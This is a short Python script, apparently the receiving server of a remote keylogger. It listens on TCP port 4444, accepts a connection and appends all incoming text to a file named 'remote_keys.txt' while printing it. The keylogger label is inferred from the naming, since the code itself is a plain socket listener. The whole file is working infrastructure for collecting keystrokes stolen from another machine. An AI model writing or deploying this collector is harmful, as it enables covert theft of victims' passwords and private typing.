# remote_logger.py
import socket

HOST = ''  # Her yerden bağlantı kabul et
PORT = 4444
OUTPUT_FILE = 'remote_keys.txt'

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen(1)
    print(f"[+] Listening: port {PORT}")
    
    conn, addr = s.accept()
    with conn:
        print(f"[+] Connection received: {addr}")
        with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                text = data.decode('utf-8', errors='ignore')
                f.write(text)
                print(f"[*] Received: {text.strip()}")
                f.flush()
        print("[*] Connection closed.")
